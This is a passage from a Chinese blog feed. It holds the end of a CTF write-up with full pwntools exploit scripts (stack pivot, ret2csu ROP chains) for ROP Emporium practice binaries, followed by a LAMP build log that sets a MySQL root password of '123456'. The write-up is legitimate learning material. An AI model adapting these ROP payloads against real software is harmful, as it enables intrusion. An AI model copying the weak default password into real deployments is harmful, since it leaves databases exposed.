class="hljs-comment">#: leave ; ret</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = flat([<span class="hljs-number">0xdeadbeef</span>,foothold_function_plt,put_plt,<span class="hljs-number">0x08048640</span>,foothold_function_got])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'stack smash'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)leak = u32(io.recv(<span class="hljs-number">4</span>))print(<span class="hljs-string">'leak'</span>+ hex(leak))ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(ret2win)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot'</span>)elf = ELF(<span class="hljs-string">'./pivot'</span>)libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]offset = libc.symbols[<span class="hljs-string">'foothold_function'</span>] - libc.symbols[<span class="hljs-string">'ret2win'</span>]put_plt = elf.plt[<span class="hljs-string">'puts'</span>]key1 = <span class="hljs-number">0x0000000000400a39</span> <span class="hljs-comment">#: leave ; ret</span>key2 = <span class="hljs-number">0x0000000000400b73</span><span class="hljs-comment">#pop rdi ; ret</span>key3 = <span class="hljs-number">0x0000000000400b02</span><span class="hljs-comment">#xchg rax, rsp ; ret</span>key4 = <span class="hljs-number">0x0000000000400b00</span><span class="hljs-comment">#pop rax ; ret</span>print(<span class="hljs-string">'offset:'</span> + hex(offset))io.recvuntil(<span class="hljs-string">'0x'</span>)leak = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,<span class="hljs-number">0x004008A0</span>])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'stack smash'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)leak = int(u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)))print(<span class="hljs-string">'leak'</span>+ hex(leak))ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]print(<span class="hljs-string">'ret2win'</span>+ hex(ret2win))<span class="hljs-comment"># raw_input('-&gt;')</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(ret2win)io.sendline(payload)io.interactive()</code></pre></div><p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot32'</span>)elf = ELF(<span class="hljs-string">'./pivot32'</span>)offset = <span class="hljs-number">44</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak1 = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">1921272</span> + <span class="hljs-number">0x000000967</span>print(<span class="hljs-string">'leak'</span>+ hex(leak1))raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + p32(leak1)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot'</span>)elf = ELF(<span class="hljs-string">'./pivot'</span>)libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)offset = <span class="hljs-number">40</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak1 = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">3977456</span> + libc.symbols[<span class="hljs-string">'ret2win'</span>]raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + p64(leak1)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p><ul><li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li><li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li></ul><p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./ret2csu'</span>)elf = ELF(<span class="hljs-string">'./ret2csu'</span>)offset = <span class="hljs-number">40</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)key1 = <span class="hljs-number">0x040089A</span>key2 = <span class="hljs-number">0x000400880</span>key3 = <span class="hljs-number">0x0000600E38</span>raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + flat([key1,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,key3,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xdeadcafebabebeef</span>,key2,<span class="hljs-number">7</span>*<span class="hljs-number">8</span>*<span class="hljs-string">'a'</span>,<span class="hljs-number">0x000004007B1</span>])io.sendline(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- Lamp搭建记录</title>
    <link href="/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Lamp搭建记录"><a href="#Lamp搭建记录" class="headerlink" title="Lamp搭建记录"></a>Lamp搭建记录</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装编译环境："><a href="#安装编译环境：" class="headerlink" title="安装编译环境："></a>安装编译环境：</h3><div class="hljs"><pre><code class="hljs undefined">yum -y <span class="hljs-keyword">install</span> gcc*</code></pre></div><p>安装好后记得关闭防火墙和selinux</p><h3 id="准备软件包"><a href="#准备软件包" class="headerlink" title="准备软件包"></a>准备软件包</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>把这些安装包都放入虚拟机自定义的路径，等待使用。</p><h3 id="shell脚本批量解包"><a href="#shell脚本批量解包" class="headerlink" title="shell脚本批量解包"></a>shell脚本批量解包</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.list<span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> `cat ls.list`<span class="hljs-keyword">do</span>        /bin/tar -zxf <span class="hljs-variable">$a</span><span class="hljs-keyword">done</span>rm -rf ls.list</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>然后开始一一的装包，注意需要按照一定的顺序来装的。</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><div class="hljs"><pre><code class="hljs bash">yum -y install python-devel</code></pre></div><p>安装python的底层环境。</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libxml2-2.9.1/</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># ./configure --prefix=/usr/local/libxml2/</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># make</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>提供一些加密算法：</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libmcrypt-2.5.8/</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># ./configure --prefix=/usr/local/libmcrypt/</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># make</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libmcrypt-2.5.8/libltdl/</span>[root@localhost libltdl]<span class="hljs-comment"># ./configure --enable-ltdl-install</span>[root@localhost libltdl]<span class="hljs-comment"># make</span>[root@localhost libltdl]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>提供加密方式的扩展</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd mhash-0.9.9.9/</span>[root@localhost mhash-0.9.9.9]<span class="hljs-comment"># ./configure</span></code></pre></div><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>提供php相关的加密支持拓展库</p><div class="hljs"><pre><code class="hljs bash">[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt</span>[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># make</span>[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>提供压缩用途的函数库</p><div class="hljs"><pre><code class="hljs bash">[roott@localhost lamp1]<span class="hljs-comment"># cd zlib-1.2.3/</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># ./configure</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><div class="hljs"><pre><code class="hljs bash">[root@localhost zlib-1.2.3]<span class="hljs-comment"># cd ../</span>[root@localhost lamp1]<span class="hljs-comment"># cd libpng-1.2.31/</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># ./configure --prefix=/usr/local/libpng</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># make </span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># make install</span></code></pre></div><p>如果出现：</p><div class="hljs"><pre><code class="hljs bash">/usr/bin/ld: //usr/<span class="hljs-built_in">local</span>/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata<span class="hljs-string">' can not be used when making a shared object; recompile with -fPIC</span></code></pre></div><p>解决办法 ： </p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd zlib-1.2.3 //进入zlib目录</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># ./configure</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># CFLAGS="-O3 -fPIC" ./configure   --prefix=/usr/local/zlib/ #使用64位元的方法进行编译</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make install</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make clean</span></code></pre></div><p>然后在重新来安装libpng即可。</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>提供jpeg格式的图片</p><div class="hljs"><pre><code class="hljs bash">[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/bin</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/lib</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/include</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir -p /usr/local/jpeg6/man/man1</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">root@localhost lamp]<span class="hljs-comment"># cd jpeg-6b/</span>[root@localhost jpeg-6b]<span class="hljs-comment"># ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</span></code></pre></div><p>如果发生这样的报错：</p><div class="hljs"><pre><code class="hljs bash">[root@localhost jpeg-6b]<span class="hljs-comment"># make</span>./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtool：命令未找到make: *** [jcapimin.lo] 错误 127</code></pre></div><p>需要：</p><div class="hljs"><pre><code class="hljs bash">[root@localhost jpeg-6b]<span class="hljs-comment"># yum -y install libtool</span>[root@localhost jpeg-6b]<span class="hljs-comment"># cp /usr/share/libtool/config/config.guess .</span>cp：是否覆盖<span class="hljs-string">"./config.guess"</span>？ yes[root@localhost jpeg-6b]<span class="hljs-comment"># make clean</span></code></pre></div><p>重新再来就好。</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>字体库。</p><div class="hljs"><pre><code class="hljs bash">[root@localhost freetype-2.3.5]<span class="hljs-comment"># ./configure --prefix=/usr/local/freetype</span></code></pre></div><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>给php提供图形拓展的库</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp]<span class="hljs-comment"># mkdir /usr/local/gd2</span>[root@localhost lamp]<span class="hljs-comment"># cd /usr/src/lamp/gd-2.0.35/</span>[root@localhost gd-2.0.35]<span class="hljs-comment"># ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</span></code></pre></div><p>这样会爆一个错，然后需要改一下源码：</p><div class="hljs"><pre><code class="hljs bash">[root@localhost gd-2.0.35]<span class="hljs-comment"># vim gd_png.c</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>需要指定一下路径即可，这个刚刚是已经安装过的。</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>先装两个工具包：</p><div class="hljs"><pre><code class="hljs undefined">cp -r apr<span class="hljs-number">-1.4</span><span class="hljs-number">.6</span> httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>/srclib/aprcp -r apr-util<span class="hljs-number">-1.4</span><span class="hljs-number">.1</span> httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>/srclib/apr-util</code></pre></div><h3 id="开始装httped："><a href="#开始装httped：" class="headerlink" title="开始装httped："></a>开始装httped：</h3><p>先进入装一下pcre：</p><div class="hljs"><pre><code class="hljs undefined">./configure<span class="hljs-built_in">make</span><span class="hljs-built_in">make</span> install</code></pre></div><p>进入httped：<br>先对配置进行设置：</p><div class="hljs"><pre><code class="hljs undefined">./configure <span class="hljs-attribute">--prefix</span>=/usr/local/apache2/ <span class="hljs-attribute">--sysconfdir</span>=/usr/local/apache2/etc --with-include-apr --enable-so <span class="hljs-attribute">--enable-deflate</span>=shared <span class="hljs-attribute">--enable-expires</span>=shared <span class="hljs-attribute">--enable-rewrite</span>=sharedmakemake install</code></pre></div><h3 id="开服务："><a href="#开服务：" class="headerlink" title="开服务："></a>开服务：</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>bin<span class="hljs-regexp">/apachectl start</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>]# vim /etc/rc.d/rc.local</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>设置开机时自动启动这个服务。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>装两个工具：</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install cmake</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install bison</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install ncurses-devel</span></code></pre></div><p>建立一个用户：</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># useradd mysql</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># id mysql</span>uid=<span class="hljs-number">1001</span>(mysql) gid=<span class="hljs-number">1001</span>(mysql) 组=<span class="hljs-number">1001</span>(mysql)</code></pre></div><p>安装ncurses：</p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# ./configure --with-<span class="hljs-keyword">shared</span> --without-debug --with-ada --enable-overwrite[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# make[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# make install</code></pre></div><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql-5.5.23]# cmake <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql \&gt; <span class="hljs-attribute">-DMYSQL_UNIX_ADDR</span>=/tmp/mysql.sock <span class="hljs-attribute">-DEXTRA_CHARSET</span>=all <span class="hljs-attribute">-DDEFAULT_CHARSET</span>=utf8 \&gt; <span class="hljs-attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci <span class="hljs-attribute">-DWITH_MYISAM_STORAGE_ENGINE</span>=1 \&gt; <span class="hljs-attribute">-DWITH_INNOBASE_STORAGE_ENGINE</span>=1 <span class="hljs-attribute">-DWITH_MEMORY_STORAGE_ENGINE</span>=1 \&gt; <span class="hljs-attribute">-DWITH_READLINE</span>=1 <span class="hljs-attribute">-DENABLED_LOCAL_INFILE</span>=1 <span class="hljs-attribute">-DMYSQL_USER</span>=mysql \&gt; <span class="hljs-attribute">-DMYSQL_TCP_PORT</span>=3306</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost  mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# make[<span class="hljs-symbol">root@</span>localhost  mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# make install</code></pre></div><h3 id="简单设置"><a href="#简单设置" class="headerlink" title="简单设置"></a>简单设置</h3><p>初始化mysql：</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R mysql:mysql .</span>[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># /usr/local/mysql/scripts/mysql_install_db --user=mysql</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>设置权限：</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R root .</span>[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R mysql data/</span></code></pre></div><p>覆盖一下配置文件：</p><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql]# <span class="hljs-keyword">cp</span> support-<span class="hljs-keyword">files</span>/my-medium.<span class="hljs-keyword">cnf</span> /etc/my.<span class="hljs-keyword">cnf</span><span class="hljs-keyword">cp</span>：是否覆盖<span class="hljs-string">"/etc/my.cnf"</span>？ yes</code></pre></div><p>接着初始化：</p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">45</span> mysqld_safe Logging to <span class="hljs-string">'/usr/local/mysql/data/localhost.localdomain.err'</span>.<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">45</span> mysqld_safe Starting mysqld daemon with databases <span class="hljs-keyword">from</span> /usr/local/mysql/data<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">47</span> mysqld_safe mysqld <span class="hljs-keyword">from</span> pid file /usr/local/mysql/data/localhost.localdomain.pid ended[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre></div><p>发现卡死了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# ps aux | grep mysql</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# kill <span class="hljs-number">-9</span> <span class="hljs-number">102872</span>[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# ps aux | grep mysqlmysql    <span class="hljs-number">103111</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">4.9</span> <span class="hljs-number">727288</span> <span class="hljs-number">49260</span> pts/<span class="hljs-number">3</span>    Sl   <span class="hljs-number">03</span>:<span class="hljs-number">39</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=<span class="hljs-number">3306</span>root     <span class="hljs-number">103201</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span> <span class="hljs-number">112728</span>   <span class="hljs-number">972</span> pts/<span class="hljs-number">2</span>    S+   <span class="hljs-number">03</span>:<span class="hljs-number">46</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> grep --color=<span class="hljs-built_in">auto</span> mysql</code></pre></div><p>杀掉重新来。<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql]# /usr/<span class="hljs-keyword">local</span>/mysql/scripts/mysql_install_db <span class="hljs-comment">--user=mysql</span>[root@localhost mysql]# /usr/<span class="hljs-keyword">local</span>/mysql/bin/mysqld_safe <span class="hljs-comment">--user=mysql</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>成功了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# vim /etc/rc.d/rc.local</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="设置mysql密码"><a href="#设置mysql密码" class="headerlink" title="设置mysql密码"></a>设置mysql密码</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# /usr/local/mysql/bin/mysqladmin -u root password <span class="hljs-string">"123456"</span>[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# /usr/local/mysql/bin/mysql -u root -p</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>成功了。注意 <code>history -c</code> 清楚历史记录命令。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>服务都正常，字符集格式也在。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h3><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># yum -y install libtool*</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install libpng-devel</span></code></pre></div><p>让php支持数据库的内容：</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># vim /usr/local/gd2/<span class="hljs-meta-keyword">include</span>/gd_io.h</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="开始安装-1"><a href="#开始安装-1" class="headerlink" title="开始安装"></a>开始安装</h3><div class="hljs"><pre><code class="hljs undefined">[root@localhost 